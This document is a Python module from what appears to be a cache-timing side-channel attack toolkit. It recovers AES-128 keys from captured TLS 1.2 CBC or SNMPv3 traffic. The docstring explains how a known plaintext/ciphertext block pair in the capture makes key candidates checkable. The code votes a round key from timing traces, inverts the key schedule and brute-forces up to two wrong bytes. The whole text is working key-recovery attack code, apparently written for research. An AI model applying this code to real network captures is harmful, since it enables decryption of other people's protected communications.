"""Recovery for a protocol that hands you both sides of one AES block.

TLS and SNMPv3 both do. A TLS 1.2 CBC record is `IV || C_1 .. C_n`, so for
known plaintext the attacker has `AES in = P_i ^ C_(i-1)` and `AES out = C_i`;
SNMPv3's CFB block 2 encrypts ciphertext block 1, which is on the wire. Either
way one free `(input, output)` pair falls out of the capture, under the key
being attacked and with nothing secret in it.

That pair is worth a lot. It turns every candidate key into a one-block check,
so the vote does not have to be perfect: a 14-of-16 vote is finished by
sweeping all 120 byte pairs at 2^16 each, which is seconds. OSCORE has no such
pair - it gives the attacker outputs only - and
`demos/oscore_coap/host/recover.py` pays for that with a structural test on
CCM's counter block instead.

WHAT THIS DOES NOT DO
  * It does not use the true key, and `truth` only ever labels the vote for a
    human. A recovery here is checkable by anyone holding the capture.
  * It does not sweep the geometry. `line_off` comes from the vector's json,
    which got it from the victim's image.
  * It stops at two wrong bytes. Beyond that the vote was not good enough and
    more traces are the answer, not more CPU.
"""
from __future__ import annotations

import numpy as np

from flashattack import aesref, bruteforce, engine


def encrypts_to(master, known_in, known_out):
    got = aesref.encrypt_blocks(bytes(master),
                                np.frombuffer(known_in, np.uint8).reshape(1, 16))[0]
    return bytes(got) == bytes(known_out)


def recover(known_out, timing, *, known, line_off=0, line_shift=4,
            pair_offsets=None, cand_per_pos=8, truth=None, vote_only=False,
            log=None):
    """(master key or None, notes, result). `known` is the (input, output) pair."""
    known_in, known_block = bytes(known[0]), bytes(known[1])
    notes = []

    if pair_offsets == "auto":
        pair_offsets, _ = engine.leaking_offsets(known_out, timing,
                                                 line_off=line_off,
                                                 line_shift=line_shift)
        pair_offsets = pair_offsets or None
        notes.append("leaking byte offsets, found without the key: %s"
                     % (pair_offsets,))

    res = engine.recover(known_out, timing, direction="enc", keysize=128,
                         line_shift=line_shift, line_off=line_off,
                         cand_per_pos=cand_per_pos, pair_offsets=pair_offsets,
                         log=log)

    if truth is not None:
        rk = bytes(aesref.key_expansion(list(truth))[-1])
        hit = sum(res.roundkey[i] == rk[i] for i in range(16))
        notes.append("vote got %d/16 round-key bytes (validation only)" % hit)

    master = bytes(aesref.invert_key_schedule(list(res.roundkey), 128))
    if encrypts_to(master, known_in, known_block):
        notes.append("verified straight from the vote")
        return master, notes, res

    if vote_only:
        notes.append("vote only: no escalation attempted")
        return None, notes, res

    # One wrong byte, then two. Each candidate costs one AES block to settle,
    # which is why this is worth doing at all.
    mk, pair = bruteforce.search_pairs(res.roundkey, None,
                                       known=(known_in, known_block), log=log)
    if mk is not None:
        notes.append("brute-forced byte positions %s (all 120 pairs, 2^16 each)"
                     % list(pair))
        return bytes(mk), notes, res

    notes.append("not recovered; vote confidence %s"
                 % [round(c, 1) for c in res.confidence])
    return None, notes, res
